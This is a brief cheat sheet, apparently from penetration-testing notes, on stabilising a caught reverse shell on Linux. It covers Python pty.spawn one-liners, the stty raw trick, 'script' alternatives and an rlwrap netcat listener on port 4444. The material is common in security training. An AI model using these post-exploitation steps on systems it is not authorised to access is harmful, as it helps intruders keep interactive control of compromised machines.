# Shell Upgrades

## Linux — Stabilize a Reverse Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
# Now: tab completion, clear screen, arrow keys, Ctrl+C works
```

## Alternative PTY Spawns

```bash
python -c 'import pty; pty.spawn("/bin/bash")'       # Python 2
script -qc /bin/bash /dev/null                        # script command
/usr/bin/script -qc /bin/bash /dev/null
echo os.system('/bin/bash')                           # from Python shell
```

## rlwrap (better listener)

```bash
rlwrap nc -lvnp 4444
# Gives you arrow keys and history in the raw shell
```
